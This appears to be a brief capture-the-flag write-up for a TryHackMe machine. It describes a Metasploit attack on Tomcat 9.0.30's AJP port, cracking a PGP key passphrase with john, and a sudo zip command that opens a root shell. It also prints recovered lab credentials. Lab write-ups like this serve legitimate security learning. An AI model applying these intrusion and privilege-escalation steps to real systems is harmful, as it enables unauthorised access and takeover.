
At first we exploited the vulnerability of the apache tomcat 9.0.30 version with the help of metasploit using the file read and inclusion of ajp running at port 8009.

We retrieve this
```
skyfuck:8730281lkjlkjdqlksalks
```

we ssh into skyfuck and go our first flag user.txt in `/home/merlin`

Two files present in skyfuck home directory
credential.pgp tryhackme.asc

After that with the help of john the ripper, we did the following steps:

```
Extract the hash from PGP private key

	gpg2john tryhackme.asc > private_key.hash

Crack the passphrase
	
	john --wordlist=/usr/share/wordlists/rockyou.txt private_key.hash

Import the private key

	gpg --import tryhackme.asc ## Passphrase is asked here

Decrypt the credential file
	
	gpg --decrypt credential.pgp ## Passphrase is asked here
	
We get merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

```

After this we ssh into merlin

```
sudo -l shows /usr/bin/zip have root privilieges

Now,
	sudo /usr/bin/zip /tmp/temp /etc/hosts -T -TT '/bin/sh #'

This gives us the root shell and then we cat /root/root.txt
to get the root flag.
```